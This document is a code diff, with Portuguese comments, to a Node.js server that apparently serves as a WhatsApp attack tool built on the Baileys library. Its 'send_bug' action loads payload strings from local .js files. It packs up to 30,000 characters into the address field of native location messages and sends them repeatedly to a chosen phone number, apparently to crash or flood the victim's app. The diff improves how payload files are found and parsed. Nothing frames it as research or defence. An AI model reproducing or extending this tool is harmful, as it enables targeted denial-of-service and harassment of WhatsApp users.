@@ -141,58 +141,74 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo de Localização carregando diretamente o conteúdo bruto dos arquivos .js ou .txt
+                // Disparo de Localização Nativa carregando exatamente o conteúdo dos arquivos .JS
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
-                    const nomeArquivo = extraData.file;
+                    const nomeArquivoBruto = extraData.file || "";
                     const quantidade = parseInt(extraData.amount) || 1;
 
                     let conteudoPayload = "";
 
                     try {
-                        let caminhoArquivo = path.join(__dirname, nomeArquivo);
-                        if (!fs.existsSync(caminhoArquivo) && !nomeArquivo.endsWith('.js')) {
-                            caminhoArquivo += '.js';
-                        }
+                        // Lista todos os arquivos da pasta para achar o arquivo .js correto (case-insensitive)
+                        const arquivosNaPasta = fs.readdirSync(__dirname);
+                        const arquivoProcurado = nomeArquivoBruto.toLowerCase().endsWith('.js') 
+                            ? nomeArquivoBruto.toLowerCase() 
+                            : `${nomeArquivoBruto.toLowerCase()}.js`;
 
-                        if (fs.existsSync(caminhoArquivo)) {
-                            // Tenta carregar via require (Módulo Node.js)
+                        const arquivoEncontrado = arquivosNaPasta.find(file => file.toLowerCase() === arquivoProcurado);
+
+                        if (arquivoEncontrado) {
+                            const caminhoAbsoluto = path.join(__dirname, arquivoEncontrado);
+                            
+                            // Primeiro tenta carregar como módulo do Node.js
                             try {
-                                const nomeModulo = path.basename(caminhoArquivo, '.js');
+                                const nomeModulo = path.basename(arquivoEncontrado, '.js');
                                 delete require.cache[require.resolve(`./${nomeModulo}`)];
                                 const modulo = require(`./${nomeModulo}`);
 
                                 if (typeof modulo === 'string') {
                                     conteudoPayload = modulo;
                                 } else if (typeof modulo === 'object' && modulo !== null) {
-                                    const chaves = Object.keys(modulo);
-                                    if (chaves.length > 0) {
-                                        conteudoPayload = modulo[chaves[0]];
-                                    } else if (modulo.default) {
-                                        conteudoPayload = modulo.default;
+                                    const valores = Object.values(modulo);
+                                    if (valores.length > 0 && typeof valores[0] === 'string') {
+                                        conteudoPayload = valores[0];
                                     }
                                 }
-                            } catch (eRequire) {
-                                // Se falhar o require, lê o texto bruto do arquivo diretamente
-                                conteudoPayload = fs.readFileSync(caminhoArquivo, 'utf8');
+                            } catch (eMod) {
+                                // Se falhar o require, lê diretamente o texto do arquivo
+                            }
+
+                            // Se o require não extraiu a string, lê diretamente o arquivo com regex para pegar o valor da variável
+                            if (!conteudoPayload) {
+                                let textoBruto = fs.readFileSync(caminhoAbsoluto, 'utf8');
+                                
+                                // Extrai o texto de dentro das aspas/crases da constante
+                                const matchAspas = textoBruto.match(/(?:const|let|var)\s+\w+\s*=\s*[`"']([\s\S]*?)[`"'];?/);
+                                if (matchAspas && matchAspas[1]) {
+                                    conteudoPayload = matchAspas[1];
+                                } else {
+                                    conteudoPayload = textoBruto;
+                                }
                             }
                         } else {
-                            console.error(`Arquivo não encontrado: ${caminhoArquivo}`);
+                            console.error(`Arquivo não encontrado no diretório: ${nomeArquivoBruto}`);
                         }
                     } catch (err) {
-                        console.error("Erro ao carregar o arquivo:", err.message);
+                        console.error("Erro ao processar o arquivo JS:", err.message);
                     }
 
                     if (!conteudoPayload) {
-                        conteudoPayload = "Localização";
+                        conteudoPayload = "Google Maps Location";
                     }
 
-                    // Limite para evitar estouro da mensagem de localização
-                    const addressPayload = (typeof conteudoPayload === 'string' && conteudoPayload.length > 30000)
-                        ? conteudoPayload.substring(0, 30000)
+                    // Limite para evitar que o pacote Protobuf estoure no Baileys
+                    const addressPayload = conteudoPayload.length > 30000 
+                        ? conteudoPayload.substring(0, 30000) 
                         : conteudoPayload;
 
                     for (let i = 0; i < quantidade; i++) {
+                        // Envia como mensagem de Localização Nativa (Gera o cartão gráfico do Mapa)
                         await waSock.sendMessage(targetJid, {
                             location: {
                                 degreesLatitude: -23.550520,
@@ -206,7 +222,7 @@ const server = http.createServer(async (req, res) => {
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ sucesso: true, mensagem: `Envio de ${nomeArquivo} realizado (${quantidade}x)!` }));
+                    res.end(JSON.stringify({ sucesso: true, mensagem: `Envio de ${nomeArquivoBruto} concluído (${quantidade}x)!` }));
                     return;
                 }
 
